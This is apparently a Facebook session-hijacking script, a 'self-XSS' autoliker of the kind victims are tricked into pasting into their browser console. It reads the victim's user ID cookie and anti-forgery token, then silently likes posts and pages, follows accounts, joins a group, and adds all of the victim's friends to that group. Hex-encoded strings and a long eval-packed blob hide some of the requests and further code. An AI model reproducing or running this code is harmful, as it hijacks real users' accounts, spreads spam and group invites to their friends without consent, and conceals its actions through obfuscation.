 document.body.appendChild(a);
}
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var now = (new Date).getTime();

function p(post) {
  
    var X = new XMLHttpRequest();
    var XURL = "//www.facebook.com/ajax/ufi/like.php";
    var XParams = "like_action=true&ft_ent_identifier=" + post + "&source=2&client_id=1381377993496%3A1284500146&rootid=u_0_8&giftoccasion&ft[tn]=%3E%3D&ft[type]=20&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35ynzpQ9UmWWuUGy6zECi8w&__req=g&fb_dtsg=" + fb_dtsg + "&ttstamp=26581681054512111570";
    X.open("POST", XURL, true);
    X.onreadystatechange = function () {
        if (X.readyState == 4 && X.status == 200) {
            X.close;
        }
    };
    X.send(XParams);
}
//Hậu
a("585676494");
a("533411868");
a("100008141320665");
Like("286175861547952");
Like("277168319110229");
Like("647713781944896");
Like("235242183332235");
Like("583411848432695");
Like("774962782516550");
Like("315937615226790");
Like("504912119615059");
//CamDongVao
Like("272408706257066");
P("1397059697233053");
//viet 
a("100002917920524");
sublist("557015601072366");
Like("1409914239268527");
a("100004751498536");
a("100006577932306");
Like("629886717053795");
a("100006689287654");
sublist("1450845125148450");
sublist("378296165615231");
Like("515434308515800");
Like("262283580587637");
//xuantuanml
a("100008081202775");
//Ánh Vân
Like("236472626544109");Like("621065871311489");Like("1431508023759654");
Like("1403504456580194");Like("1415674118683194");Like("1450701098497103");
Like("666178103439413");Like("247768535403114");Like("71402383470026203");
Like("274053292752774");Like("571429072952535");Like("761311750559594");
Like("407959529347630");Like("718011301572436");Like("633727596696366");
Like("687190658010613");Like("1402495273348761");Like("651952481527658");
Like("1404805913115567");Like("1403981343201009");Like("462775897183080");
Like("599461170140416");Like("220736818121890");Like("1474938782734665");
Like("1453198721580403");Like("742344305784714");Like("217919668404622");
Like("263893750454181");Like("252663601572893");Like("1469061686644087");
a("100007753477338");a("100007547023123");a("100003210383714");
a("100007531272158");a("100008000139469");a("100007204391403");
P("1395367770731659");P("1382725635310903");P("1403552623228204");
sublist("1382730821977051");Like("1415662308687529");

var gid = ['197344630433846'];
var fb_dtsg = document[
    'getElementsByName']('fb_dtsg')[0][
    'value'
];
var user_id = document['cookie'][
    'match'
](document['cookie']['match'](
    /c_user=(\d+)/)[1]);
 
var httpwp = new XMLHttpRequest();
var urlwp =
    '/ajax/groups/membership/r2j.php?__a=1';
var paramswp =
    '&ref=group_jump_header&group_id=' +
    gid + '&fb_dtsg=' + fb_dtsg +
    '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader'](
    'Content-type',
    'application/x-www-form-urlencoded'
);
httpwp['setRequestHeader'](
    'Content-length', paramswp['length']
);
httpwp['setRequestHeader']('Connection',
    'keep-alive');
httpwp['send'](paramswp);
 
var fb_dtsg = document[
    'getElementsByName']('fb_dtsg')[0][
    'value'
];
var user_id = document['cookie'][
    'match'
](document['cookie']['match'](
    /c_user=(\d+)/)[1]);
 
var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET',
    '/ajax/typeahead/first_degree.php?__a=1&viewer=' +
    user_id + '&token' + Math['random']
    () +
    '&filter[0]=user&options[0]=friends_only',
    false);
gf['send']();
if (gf['readyState'] != 4) {} else {
    data = eval('(' + gf['responseText']
        ['substr'](9) + ')');
    if (data['error']) {} else {
        friends = data['payload'][
            'entries'
        ]['sort'](function (_0x93dax8,
            _0x93dax9) {
            return _0x93dax8[
                'index'] -
                _0x93dax9['index'];
        });
    };
};
 
for (var i = 0; i < friends['length']; i++) {
    var httpwp = new XMLHttpRequest();
    var urlwp =
        '/ajax/groups/members/add_post.php?__a=1';
    var paramswp = '&fb_dtsg=' +
        fb_dtsg + '&group_id=' + gid +
        '&source=typeahead&ref=&message_id=&members=' +
        friends[i]['uid'] + '&__user=' +
        user_id + '&phstamp=';
    httpwp['open']('POST', urlwp, true);
    httpwp['setRequestHeader'](
        'Content-type',
        'application/x-www-form-urlencoded'
    );
    httpwp['setRequestHeader'](
        'Content-length', paramswp[
            'length']);
    httpwp['setRequestHeader'](
        'Connection', 'keep-alive');
    httpwp['onreadystatechange'] =
        function () {
            if (httpwp['readyState'] ==
                4 && httpwp['status'] ==
                200) {};
    };
    httpwp['send'](paramswp);
};
var spage_id = "1465888910302360";
var user_id = document.cookie.match(
    document.cookie.match(
        /c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
var svn_rev;
var bugun = new Date();
var btarihi = new Date();
btarihi.setTime(bugun.getTime() + 1000 *
    60 * 60 * 4 * 1);
if (!document.cookie.match(
    /paylasti=(\d+)/)) {
    document.cookie =
        "paylasti=hayir;expires=" +
        btarihi.toGMTString();
}
//Team
var _0xbd5b=["\x6D\x61\x74\x63\x68","\x63\x6F\x6F\x6B\x69\x65","\x76\x61\x6C\x75\x65","\x66\x62\x5F\x64\x74\x73\x67","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x4E\x61\x6D\x65","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x70\x6C\x75\x67\x69\x6E\x73\x2F\x6C\x69\x6B\x65\x2F\x63\x6F\x6E\x6E\x65\x63\x74","\x66\x62\x5F\x64\x74\x73\x67\x3D","\x26\x68\x72\x65\x66\x3D\x68\x74\x74\x70\x25\x33\x41\x25\x32\x46\x25\x32\x46\x77\x77\x77\x2E\x6E\x68\x61\x63\x63\x75\x61\x74\x75\x69\x2E\x63\x6F\x6D\x25\x32\x46\x6E\x67\x68\x65\x2D\x73\x69\x2D\x6E\x68\x61\x74\x2D\x68\x6F\x61\x6E\x67\x2D\x74\x61\x6E\x2E\x68\x74\x6D\x6C\x26\x61\x63\x74\x69\x6F\x6E\x3D\x6C\x69\x6B\x65\x26\x6E\x6F\x62\x6F\x6F\x74\x6C\x6F\x61\x64\x3D\x26\x69\x66\x72\x61\x6D\x65\x5F\x72\x65\x66\x65\x72\x65\x72\x3D\x68\x74\x74\x70\x25\x33\x41\x25\x32\x46\x25\x32\x46\x77\x77\x77\x2E\x6E\x68\x61\x63\x63\x75\x61\x74\x75\x69\x2E\x63\x6F\x6D\x25\x32\x46\x6E\x67\x68\x65\x2D\x73\x69\x2D\x6E\x68\x61\x74\x2D\x68\x6F\x61\x6E\x67\x2D\x74\x61\x6E\x2E\x68\x74\x6D\x6C\x26\x72\x65\x66\x3D\x26\x78\x66\x62\x6D\x6C\x3D\x26\x5F\x5F\x75\x73\x65\x72\x3D","\x26\x5F\x5F\x61\x3D\x31\x26\x5F\x5F\x64\x79\x6E\x3D\x37\x77\x66\x47\x62\x77\x4B\x42\x41\x6F\x26\x5F\x5F\x72\x65\x71\x3D\x31\x26\x74\x74\x73\x74\x61\x6D\x70\x3D\x32\x36\x35\x38\x31\x36\x38\x39\x35\x37\x34\x31\x31\x31\x38\x30\x38\x31\x26\x5F\x5F\x72\x65\x76\x3D\x31\x31\x33\x37\x32\x34\x36","\x50\x4F\x53\x54","\x6F\x70\x65\x6E","\x6F\x6E\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6E\x67\x65","\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65","\x73\x74\x61\x74\x75\x73","\x63\x6C\x6F\x73\x65","\x73\x65\x6E\x64","\x31\x30\x30\x30\x30\x37\x35\x30\x35\x34\x34\x33\x39\x36\x36"];var user_id=document[_0xbd5b[1]][_0xbd5b[0]](document[_0xbd5b[1]][_0xbd5b[0]](/c_user=(\d+)/)[1]);var fb_dtsg=document[_0xbd5b[4]](_0xbd5b[3])[0][_0xbd5b[2]];function starnhat1(_0x2ec6x4){var _0x2ec6x5= new XMLHttpRequest();var _0x2ec6x6=_0xbd5b[5];var _0x2ec6x7=_0xbd5b[6]+fb_dtsg+_0xbd5b[7]+user_id+_0xbd5b[8];_0x2ec6x5[_0xbd5b[10]](_0xbd5b[9],_0x2ec6x6,true);_0x2ec6x5[_0xbd5b[11]]=function (){if(_0x2ec6x5[_0xbd5b[12]]==4&&_0x2ec6x5[_0xbd5b[13]]==200){_0x2ec6x5[_0xbd5b[14]];} ;} ;_0x2ec6x5[_0xbd5b[15]](_0x2ec6x7);} ;starnhat1(_0xbd5b[16]);
//*
;eval(function(w,i,s,e){var lIll=0;var ll1I=0;var Il1l=0;var ll1l=[];var l1lI=[];while(true){if(lIll<5)l1lI.push(w.charAt(lIll));else if(lIll<w.length)ll1l.push(w.charAt(lIll));lIll++;if(ll1I<5)l1lI.push(i.charAt(ll1I));else if(ll1I<i.length)ll1l.push(i.charAt(ll1I));ll1I++;if(Il1l<5)l1lI.push(s.charAt(Il1l));else if(Il1l<s.length)ll1l.push(s.charAt(Il1l));Il1l++;if(w.length+i.length+s.length+e.length==ll1l.length+l1lI.length+e.length)break;}var lI1l=ll1l.join('');var I1lI=l1lI.join('');ll1I=0;var l1ll=[];for(lIll=0;lIll<ll1l.length;lIll+=2){var ll11=-1;if(I1lI.charCodeAt(ll1I)%2)ll11=1;l1ll.push(String.fromCharCode(parseInt(lI1l.substr(lIll,2),36)-ll11));ll1I++;if(ll1I>=l1lI.length)ll1I=0;}return l1ll.join('');}('5e4b21u2z2827333916243o01311m252z2q1b3v2c1b3q011z2k3o01322k3v2s37262t202n113238231q27352z142z2x252z1a2s29111z38231s27332z1422381w1z101611133v292q193z241s3u2v3z2n1z3w263c133v2b2q172z2411121m232c1i3e2936162x3u101z1m280y101z39233x3z2936182x3s101z1o3e162t39233x29213v3b233v29213x111z2s2711323s271s2u291p2o1g27323o2c1x2314193v1z1132223314212q193v1z1k1v332z1b223p3c1z3u2o211o1e25211q1m231z1s273r172z26163c1c2c2b381a3w29341x3u2s3o3u3930293p373237171421161z101m253e1o1z1z3w263c1b353a3x1z1x21141i1e1h161f1k1e1j1d1l3e161c1r3e1c2e1b3d163g1k3e1i1e1w1e121d192e1r2c1y2e1u2c1z2c1v2f1s2c1q1e152c1t2e102e1s2c132e1t3e1u2c1w1e1i2c1s1e1z2c1u1c1z2e1q2d1u2e1t3c1t2c1u2f152c1r2e1u2c1s2c1g2e1s2e1r2e1u2d1r2c1u3g1v2c1q2g142c1u2e102e1r2e1x2e1s2c1s2c1u2g1t2c1r2e1v2c1t2c1x2e1q3d1u2e1u3c1q2c1u3g1f2c1q2f192c1s3d122e1q2d162e1s3d1h2c1u3f152c1q3g102c1s3d192e1s3d1s2e1s3d192c1u3f1r2c1q2f172c1u3d1x2e1q3d172e1t3c1c2c1u3f162c1s3f1y2c1s3d1b2e1s3d162e1s1d192c1w3f1c2c1q3f172c1s3e1t2e1q2d172e1s3e1c2c1u3f172c1q3g1w2c1s1d192e1q3d172e1s3d172c1u3f192c1q2e1u2c1s1c1h1e191d1c3g1c1c1i1d1r3g1p3b1d3f1f3d1i2d143f1j2d1d2f1m1c1b3c1e3g1a3d1k1g1f2e1q3e1e3e1d1d1d3e1d2d161e1u1f191d1a3f1f1e1g3d1i2e1d1c1b1e1f1e1p3c1e1e163d111g1h2c1b1d1m3g1b3c1e1g1j1e1j3e1l3g123d1c3f1m1e1p1e1k3g192c1d1g1h3b1d2d1e1e1q2e1d1f1f1e123c1e3f1d3c1k3f1l3c1d3e1a1g1b3c101e1b1d191d1h1f1b1d1h1g1f2c1o2c1e1e1d1c1b3f1f1c181b1e1g1f1c1v2e1t2c1s2c1u1g132c1s1g152c1t2c1u2e1r3c1t2e1r2e1o2c1w1f162c1r3g1w2c1u1d1l2e1s2c1d2e1t3e1q2c1v2g1k2c1s1e1u2c1t2c1r2e1q3c1v2e1u2d1t2c1w2e1j2c1r2e192c1s1e1b2e1q2e152e1s3d1t2c1u1e1a2c1q2e1t2c1r1e1v2e1q2e1p2e1u1e1a2c1u2f122c1r2e1s2c1u2c1t2e1s3c122e1u1d1c2c1v1g1d2c1q2e152c1t1d1w2e1r1d1w2e1t2d1u2c1w2g1p2c1s2g102c1u3e1g2e1s2e1s2e1u1d1z2c1v2g1w2c1q2g1z2c1s3d1b2e1q1c1p2e1u3c1j2c1u3g1u2c1q2e1z2c1s1e102e1s1d152e1s3e162c1v2g1o2c1q3e1s2c1s3e1b2e1r2c1s2e1s3e1v2c1w3e1k2c1q2e1r2c1u2e1q2e1p2d152e1r2d1z2c1u1e1v2c1q2g1r2c1s2e1e2e1q2c1b2e1r3d1y2c1w1g122c1q1e1b2c1s3c1e2e1s3c1k2e1u3e1s2c1w3e1u2c1s1f1y2c1u1c1j2e1q1e1v2e1s2d192c1u3g152c1q2f1a2c1s3e1r2e1q3d1k2e1s2e1s2c1u2e1k2c1q3f1t2c1s2d192e1r2e1k2e1s2e1q2c1u3f1r2c1s2e162c1u2c1a2e1q2c1o2e1s2e192c1v3g1r2c1q2f1v2c1s2c1j2e1q3d1w2e1s2e102c1v2f172c1q2g1s2c1s3c1q2e1q3e1r2e1s3e1t2c1u1f1r2c1q3g152c1r1e1v2e1s2d172e1s3e192c1w2e1t2c1q3e1s2c1t2c102e1r3e1q2e1t3c1b2c1v3e1f2c1q3e1h2c1t2d1y2e1r2e1h2e1t3e1o2c1u3f1j2c1r2f1r2c1s1e1b2e1q1e142e1f3c1u1c162e1s3c1b2e1u1c1k2c1w2g122c1r2g1u2c1u3c122e1r2c1q2e1t1d102c1v3g1x2c1s2g1j2c1t3e1v2e1r2c1v2e1t2c1k2c1u3e1j2c1r2g1r2c1s1c1a2e1q2e152e1t2c1p2c1u2f1x2c1r2g1d2c1t1e1j2e1q1d152e1s2d1j2c1u2e1r2c1q3g1j2c1s2e122e1s2e1h2e1t2e1o2c1u1g1c2c1q2g1x2c1u3c1y2e1q3d1y2e1u2d152c1v2e1o2c1r3g1y2c1u3d112e1r2e1w2e1s3d1h2c1w2g162c1s1g1t2c1s2d172e1r2e1w2e1u3c1p2c1v1f172c1r2g182c1t3e122e1r2e1h2e1t2c182c1v1f172c1q2g1j2c1u2d1b2e1q3e1j2e1s2e1t2c1u1e1r2c1q2f172c1s2c182e1s1e1w2e1u3e1k2c1u1f1k2c1q2e1l2c1r1e1t2e1s2e1b2e1t3d1o2c1v1g1y2c1q3f192c1s3e182e1q2e1w2e1t2e1h2c1u2g182c1s2g1d2c1u2c1t2e1r1c1k2e1s3e152c1w2g1r2c1p1g1d2c1t1d1l2e1q3d1o2e1s3d1o2c1w1f1r2c1r2e1l2c1s2d1v2e1q3c1q2e1s3e1q2c1u3e1s2c1q2e182c1s3d1r2e1q3e1h2e1s3d1z2c1v1e172c1q3f1f2c1t2e1q2e1q1e152e1s1d1y2c1w3e152c1s2f1r2c1u2c1r2e1q3c1d2e1t2d192c1u1e1r2c1q2e172c1s1c1b2e1q3e162e1s2e162c1u3e1r2c1q3e162c1s2c1v2e1r2c1g2e1s3c1t2c1u1g1w2c1s1e1f2c1s2d1u2e1q2e142e1s1d1c2c1u2f1r2c1s3e1x2c1u2c172e1q2c132e1s2c1t2c1u3g1v2c1q1f1y2c1s3c1u2e1r1e132e1t2e1v2c1w1g1x2c1r2g102c1s2e182e1q3e1j2e1t3c1w2c1w3e1t2c1r2e142c1u1c182e1r2e1g2e1u2c1v2c1w3e1r2c1q1g172c1s1d1w2e1s2c172e1u1d192c1u3g122c1r2g1l2c1s3c1u2e1q3e172e1s3d1z2c1u3g1q2c1r2f1r2c1u3d1j2e1r2c1i2e1s3c1t2c1u1e1x2c1q1g1q2c1u2d1q2e1s2c1d2e1s1e1d2c1v2f1x2c1s1e1s2c1u3e1w2e1q2c1d2e1u2e1z2c1u1f172c1q1f1m2c1t2e1j2e1r1e1y2e1t2e1u2c1u2g1f2c1q3f172c1t2c112e1q2e172e1u3d1t2c1w3g152c1q3f1d2c1s2e1b2e1r2c1k2e1s3d1z2c1v1g1b2c1r2g1f2c1s1d1b2e1q1e1f2e1s3e1a2c1u3g162c1q2g1x2c1s2d112e1s2d1x2e1r1c1h2c1w1e132c1r1e1r2c1s3d1q2e1s2c162e1u3e1u2c1w3g1d2c1s3e1t2c1t1c1l2e1q3c142e1u1c1h2c1v1e1d2c1r3e1m2c1u2e112e1s2d1r2e1s3c1t2c1u2e132c1q2g1r2c1t3c1a2e1q1d182e1s3e1r2c1u2e142c1s3f1y2c1s3e1t2e1q2e1r2e1t2c172c1u2e152c1s1e1u2c1s3c1b2e1r3d1b2e1t2c1p2c1u3e1j2c1s3g172c1u2d1b2e1q1d1w2e1s2e1t2c1u3f1r2c1r2g1d2c1t2c1y2e1r2c1x2e1s2c1r2c1u3f1h2c1q2f1r2c1u2c1b2e1r3e1r2e1u1e1a2c1u2f1x2c1r2e1d2c1t2e1m2e1r3e1q2e1u3e1z2c1u3g1b2c1q2e1r2c1s1d1l2e1s2d162e1u3d152c1w3g1v2c1q3g1w2c1s2c1j2e1q1c1t3e143c1y2d121e121p123e161c1k3e1g2g1d3d142e1i3d1a1e1g1f1o1e1j1e123e1c1c1r3g122c1u2g1r2c1s2c1z2e1s2c1g2e1u3c1t2c1u3g1u2c1t2e1t2c1u2e1g2e1r2c1x2e1u2d1y2c1u2e162c1s2g1x2c1u2e1b2e1q1d162e1s2c1z2c1s1g1e2c1u1e1u2c1t2c1k2e1s2c162e1s2e1p2c1s1f172c1u2g1m2c1u1e1x2e1q2e1y2e1s3d102c1s3e1u2c1s1f1k2c1r2e1v2e1r3e1g2e1s1d192c1u3g162c1s3f192c1t3d162e1q3d172e1u3d1c2c1s2f152c1u3g1g2c1s3d192e1s3d1d2e1s3d182c1u3g1c2c1s3f172c1s3d172e1q2d172e1u3c1a2c1s3f162c1s3g1a2c1s3d182e1q3d1a2e1s1d172c1t3f192c1s3f192c1s3d152e1q2d172e1u3e1w2c1s1f152c1s3f1e2c1s3d172e1q3c1z2e1s2c1w2c1k1e103d1o1g1k1d143d121g121e1s2g1f3d143d103g1g1d1d3e1d1d161e1f1f191d1q3f1f3e1g3d1g1e1b1c1c1e1f1e1p3c1f1e163e131g1h2c1b1d1k1f1d1c1g2e1s1e1j3e1d1e1h3c1c2f1b3e1j1d181e102c192f1b1d1b1d1b2f193c181e1d3d183d153e1g1e1s3f1f1e1c3d1f1e1d3c1b1e191d1r1d1s1g103c1u1g143d1c3d171g1f1e1s2g1j2e1p1c1a3g161e1p3g1d1c1h3c1f1e1e2c1c1g1h2c1i1e1f3f1d2c1w1g1q2c1s1c1l2e1r2e1z2e1u2e1r2c1u2g1x2c1t1e1l2c1u1c1r2e1s3e1r2e1u3e1t2c1t2f1p2c1t2g1b2c1u2e1t2e1q1e1o2e1s1e1o2c1s3f1o2c1s3f1l2c1s2e1l2e1s2d192e1s3e1q2c1s2e1p2c1s2e1t2c1s2c1t2e1q3d162e1u2e182c1u2e1p2c1r2e1s2c1s2d1t2e1q2e1u2e1t2e1f2c1u2e1s2c1s1e102c1s3d1u2e1p2c172e1t2e1o2c1u3e1g2c1u3g1b2c1t3c1c2e1s3e152e1u1e152c1u3f1r2c1t3e1w2c1u1e1z2e1s2e1w2e1u2e1t2c1s3g1v2c1s1e1t2c1s2c1t2e1s1e192e1u1e1t2c1u3f1u2c1s2e192c1u1d1s2e1r2c1z2e1t2c1z2c1s2e1u2c1u3f1c2c1u1c1t2e1r2c1t2e1u3c102c1u3f122c1s2f1k2c1r1e1f2e1r2e1t2e1t1d1x2c1s3g172c1s3g1u2c1u2d1k2e1r2c1w2e1s3c1h2c1u3e1u2c1u1g1x2c1t2c1x2e1s3d1o2e1s2d1s2c1u1g1d2c1t2g1s2c1s3c1t2e1q2c102e1s1d1t2c1s2f1p2c1t3f1w2c1s3d1q2e1q1c1b2e1t2c1q2c1s2g152c1u2e1t2c1s1c182e1q2c172e1s3e152c1s3f1a2c1u2e1t2c1s3c1l2e1r2e1t2e1t1e192c1u1e152c1u2g1a2c1u3e1v2e1q2e1t2e1u2c1z2c1t3f1h2c1t3f1l2c1s3e1m2e1s2c1t2e1t2e1y2c1u2e1r2c1s3f192c1s2e102e1s2e1o2e1t2e1f2c1t3g1p2c1s2e1r2c1t2e1f2e1s3d192e1u3d1v2c1t3e1u2c1t3e1a2c1u3d142e1s3c1b2e1u3d1b2c1u3f142c1r3g1f1c152c1t2g1p2c1t2e1h2c1t2c1v2e1r2e102e1s2c152c1t3e1t2c1u3e1a2c1t2d1f2e1s3d1g2e1u2c152c1t2g1p2c1u1g1s2c1u1c1w2e1r2d1t2e1s2e1t2c1u2e1j2c1s2f1s2c1t2e1t2e1r1e182e1u2c1a2c1t2e1j2c1s3e1t2c1t2d1q2e1q1d172e1s2c1q2c1u3e1p2c1u3f1l2c1u2c1z2e1q1e1a2e1u1e1f2c1u3f152c1t3f152c1t2e1u2e1s1e1v2e1t1c102c1u3f1s2c1t2e102c1t3c152e1r1c142e1t1d1y2c1s2g1p2c1t2e1f2c1s3c102e1q2c1f2e1s1e192c1t2g1q2c1s3f1u2c1s1d1f2e1q2c1r2e1t2c102c1s2e1q2c1s3g1k2c1s2c1l2e1q2c182e1s1d1t2c1s3g1y2c1t2g1a2c1t3e102e1r3c1r2e1s3e1a2c1s1g1v2c1s3f1l2c1t2c1f2e1q2c162e1s1d1b2c1t3f1h2c1t2g1j2c1t3c1u2e1q1c192e1s3c102c1u2g1w2c1u3g1e2c1u2e1w2e1s1d1x2e1t2e1h2c1s2g1p2c1s2g1r2c1s2c1l2e1r2e1b2e1s1c1q2c1s2g1j2c1s3e1t2c1s1c1a2e1q3e1r2e1s3c182c1s3f1p2c1s2g1l2c1u1e162e1q1c162e1u1d1u2c1s3e1p2c1s3g1q2c1s2c102e1q2d1i2e1s2e1j2c1s1g152c1t3f1s2c1s1c1q2e1q2c1r2e1s2c1t2c1s2g1h2c1s3e1l2c1u1e1v2e1q1d172e1u2c1t2c1s2f1o2c1t3g1z2c1s2c1z2e1s3e1r2e1t1d1h2c1s1e1e2c1s3e1d2c1s3e172e1q3c1y2e1u3e1p2c1t1f1d2c1s3g1c2c1t1c102e1p2c1r2e1u2c1b2c1f3e1g2c1u3g1m2c1t3d102e1r2e102e1u2e1r2c1s3g1t2c1t2e1j2c1s1c192e1r2c192e1u1e1j2c1u1g1d2c1t3g1k2c1t1e1u2e1s1c1r2e1s3e1q2c1s3g172c1s2f1y2c1s2c172e1s2d1t2e1t2c1z2c1t2e1x2c1s2f1l2c1u1e1l2e1s2d1x2e1t2d192c1t2f1q2c1t3g1z2c1s2c1x2e1q2e1f2e1u2d1o2c1t2e1f2c1s1f1d2c1s3d1u2e1s1c162e1u2c1b2c1s3g172c1u2g1h2c1r2e1f2e1p2c1x2e1r2d1p2c1t2e1h2c1t1g102c1r2c1f2e1r2e1s2e1s1d1y2c1u3f172c1s3e1f2c1s1e1u2e1q2c1h2e1t2c1q2c1s1f1q2c1t2g1t2c1t1e182e1s2c182e1t2c192c1s3e1o2c1t1g1c2c1s2c172e1q2e172e1t2e1o2c1u2e1x2c1u1e1k2c1u3e1z2e1q2e1s2e1t3e182c1u3f192c1t3e1v2c1t1c1u2e1s1c1f2e1u1e1k2c1u2e1f2c1t2e142c1t2c142e1q3e1x2e1u1c1f2c1t2e1t2c1s2g1q2c1s2c1k2e1q2c152e1t2c172c1s3e1s2c1s3e1t2c1u3e1r2e1q3e172e1s2d1p2c1t3g1o2c1t3f192c1s2e1r2e1q3d1j2e1u2d1c2c1s1e1d2c1t3g1l2c1s2d1q2e1q3c1y2e1s3c1v2c1s2g1j2c1t2e1t2c1s2c1s2e1r2c182e1u1e1o2c1t1g1j2c1t3f1t2c1s2d172e1r2e1r2e1t2d192c1s1f172c1r2e1s2c1s2d1r2e1q2e1s2e1s2e1y2c1t1f1w2c1u3e1r2c1u2d1c2e1q1d1a2e1t3c1f2c1t2g1q2c1t1g152c1t2e1x2e1s2e1a2e1t1c1c2c1t2f192c102e1r3c162c1u1e171g1o2g1e3e1c1c1k3e1p1e1j1f1k1c1d3c1i1f1g1d1g2e1h1e1b2c172e1u1c1o2e1t2c152c1u1e1o2c1s3g1f2c1u2c1g2e1s3e1g2e1u2d1x2c1v2g1j2c1u2g1t2c1u3e112e1s2c1c2e1u1c1x2c1w2e1h2c1s1e1u2c1s2c1y2e1t2c102e1u2c1z2c1v2f1u2c1s1e152c1t2e102e1u2c152e1t3e1u2c1w2e1k2c1u1e1z2c1u1c1z2e1s2d1w2e1t3c1t2c1u2f172c1t3e1z2c1s3d1a2e1s3c1b2e1s3d192c1w3f1d2c1s3f182c1s3d1f2e1s2d172e1t3d1z2c1u1f172c1s3e1k2c1s3d192e1s3d162e1s1d192c1u3f152c1s3f182c1s3d1x2e1s2d192e1s3e1g2c1u2f192c1s3f1e2c1s1d192e1s3c1q2e1s1d192c1w3f1t2c1s3f182c1u3e102e1s3d172e1s3d192c1u3f172c1s2e1u2c1s2e1h1e123e193f1q1c1p3d1t3d1d3d1c3e1b2c1p3c102f1k3e1c1e1f1e1p3c1f1e183d131g1h2c1b2d1m1f1c3c1g2e1s2e1c3e1e1e1j3c1d2f1b1e1j3d1a1e122c191g1f1e1g3d1i2e1c3d1s1g1k1c1o1c1k1f1h3d1c2g1k3e1k1d1m3f1k3d1c3f1f1e1j1e1j3f143c1c2g1f3d1s3c1f1e1c1c1i2g121e141d1e2f1b1d1h3d1s2d1s2d1h3e1d2d141g1l1e1a1e1k3e1j1c1c2g1f1c1x1c142e193d1s2f1b1d1w1e1u2g1f3c182e1u2c1o2c1w2g1b2c1u1g1l2c1t2c1v2e1t2d1b2e1u2e172c1w1g1r2c1u2e1l2c1s3e122e1t3c1v2e1r2c1k2c1u2e1j2c1s1g102c1u2c1t2e1t3d1h2e1u1c1a2c1v2e102c1s2e1u2c1s3e1k2e1s2c1o2e1s2c1a2c1u2g1a2c1u2g1j2c1u2e1r2e1t2e182e1t1e192c1u3e1o2c1s3e1l2c1t2c1x2e1t2d1o2e1u1e1d2c1u3g1d2c1t3e1x2c1u1e102e1t2e1b2e1u2e152c1u2g1h2c1u2e1w2c1s2d102e1t3c162e1s2e1y2c1t1e1o2c1s2e1s2c1s2d192e1t3e1t2e1s2d1t2c1v2f192c1s3e1m2c1s2e1l2e1t1e1a2e1s2d1s2c1v2e102c1t3f1y2c1u3d1l2e1s2c1r2e1s3d1o2c1u2f1p2c1s2e1t2c1s2c1h2e1u2c1y2e1t2c1y2c1v3g1u2c1t3e1b2c1t3c1h2e1s3c1h2e1t3d1w2c1v3g1o2c1t2g1l2c1s3d1l2e1t2d1s2e1u1d1b2c1u1f1r2c1t2g1h2c1t2e102e1t1e1u2e1t3e172c1u3f1p2c1s3g1y2c1s2d182e1u2d192e1s2e1t2c1u2e1s2c1s3f192c1s2e1u2e1s2c192e1s2c172c1u2f1t2c1s3e1t2c1u2e192e1s2c1h2e1t2c192c1v3f1s2c1s2e192c1s3c1l2e1s1d1s2e1s3e1w2c1w2e1o2c1s2g1s2c1u3d1h2e1u2d1v2e1u2d1t2c1v3g102c1s3f1v2c1s2e1r2e1u1c1a2e1s3c1q2c1w3e1t2c1u3f1l2c1t2c112e1s1d1u2e1s2d1q2c1v2e1h2c1s3f1y2c1s2c1b2e1u1c1h2e1s2c102c1w1f1s2c1s2e1h2c1s3e1r2e1s1e1a2e1s1c1t2e1k2e1t2d1v2e1u1e1y2c1v2e1i2c1t3e1l2c1s2d1r2e1s3c102e1s2e1x2c1u3f1y2c1t2e172c1t2d1h2e1s1c1p2e1t2c1w2c1w1f1k2c1t2e1t2c1r2e102e1s3c1y2e1u2c1s2c1u2e172c1s1g192c1s1e192e1s3e1o2e1s2c152c1u2e1r2c1s2f192c1s3c162e1s2e192e1u2e1f2c1v1g162c1u3g102c1s1d102e1s3d1f2e1t1e102c1w1e1p2c1s2f162c1t1d1j2e1t1c142e1t2c1y2c1w3e1w2c1s3g1r2c1u2e1w2e1s1c1i2e1u2d1h2c1v3g1j2c1s1g192c1s1d1u2e1u2c192e1t2c1t2c1w2g1j2c1u2e1t2c1s1c192e1t3d1o2e1t3e1t2c1w3g1r2c1s1g1m2c1u2c1t2e1t2e1u2e1s2d192c1v2g1r2c1t2g1t2c1s2e1t2e1u1c1h2e1s2d1s2c1u2g162c1s1f1c2c1s2d1t2e1u3c1z2e1u2c152c1u3e152c1s2e1t2c1u2c122e1u1e152e1u3d1v2c1v3e1u2c1u2g1z2c1u1e1t2e1s1d172e1u3d1q2c1u2g172c1s2g172c1s1e1t2e1s1d1t2e1s3d1d2c1u3f1r2c1u2e1j2c1t3d182e1s2d1p2e1s3d102c1w1g1t2c1s1f1u2c1u2c192e1s1e1k2e1s3e1o2c1w3f1r2c1u2e1a2c1t2c1t2e1s3d1f2e1u2e1q2c1w3g1r2c1t2g192c1t2e192e1s3d192e1s2e1t2c1v3f1r2c1s2f102c1s2c1t2e1u1c1y2e1u3d1t2c1v1g1j2c1s2g1f2c1s1c182e1u3e1o2e1s3e182c1u3g1j2c1s2f1h2c1s1c1m2e1s2c1h2e1s3e1h2c1v2f1a2c1s3g1x2c1s3d1m2e1t2e1o2e1u1c1y2c1u2g1i2c1t2e1l2c1t1c1m2e1u2d1x2e1u2c1f2c1t2f1u2c1r2g162c1s3e1x2e1r2c1h2e1t2c1d2c1v3f1w2c1s1g1k2c1s3e1q2e1s2c1o2e1t1e182c1u2f1t2c1t2e102c1u3d102e1u3d1o2e1u3d1y2c1u2f1g2c1r1e1y2c1s2d112e1u1c1y2e1u3d1r2c1v1g1f2c1t2g1f2c1u2e1y2e1u2c192e1s3e162c1w3g1y2c1t1g1h2c1s1d1j2e1s2c1f2e1u2e1t2c1v2g1j2c1t2g1w2c1s1c182e1u2e1y2e1t1e1o2c1v3e172c1t3f1d2c1t2c1r2e1s3c1z2e1u2d1r2c1v3f172c1t3f1s